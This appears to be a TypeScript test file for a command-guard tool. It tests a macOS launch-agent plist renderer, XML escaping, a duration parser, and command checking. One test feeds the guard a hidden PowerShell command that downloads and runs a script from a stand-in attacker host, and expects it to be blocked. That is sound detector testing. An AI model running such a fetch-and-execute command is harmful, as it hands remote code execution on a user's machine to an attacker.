import { test } from "node:test";
import assert from "node:assert/strict";
import { existsSync } from "node:fs";
import { parseDuration, guardBinary, check } from "../src/guard.ts";
import { renderPlist } from "../src/autostart.ts";

test("launch agent definition runs the guard binary quietly, at login, and restarts it", () => {
  const plist = renderPlist("/Users/x/baitline/guard/target/release/baitline-guard", "/Users/x/.baitline");
  assert.match(plist, /<string>com\.baitline\.guard<\/string>/);
  assert.match(plist, /<string>\/Users\/x\/baitline\/guard\/target\/release\/baitline-guard<\/string>\s*<string>--quiet<\/string>/);
  assert.match(plist, /<key>RunAtLoad<\/key><true\/>/);
  assert.match(plist, /<key>KeepAlive<\/key><true\/>/);
  assert.match(plist, /guard\.err/);
});

test("paths with XML-special characters are escaped in the agent definition", () => {
  const plist = renderPlist("/Users/a&b/<guard>", "/l");
  assert.match(plist, /\/Users\/a&amp;b\/&lt;guard&gt;/);
  assert.doesNotMatch(plist, /<guard>/);
});

test("parseDuration", () => {
  assert.equal(parseDuration("90s"), 90_000);
  assert.equal(parseDuration("2m"), 120_000);
  assert.equal(parseDuration("1h"), 3_600_000);
  assert.equal(parseDuration("5"), 300_000);
  assert.throws(() => parseDuration("soon"));
});

test("check delegates to the built guard binary", { skip: !existsSync(guardBinary()) ? "guard binary not built" : false }, () => {
  const bad = check('powershell -w hidden -c "iex(irm https://evil.example/x)"');
  assert.equal(bad.blocked, true);
  assert.match(bad.output, /powershell-hidden/);
  const ok = check("git status");
  assert.equal(ok.blocked, false);
  assert.match(ok.output, /clean/);
});
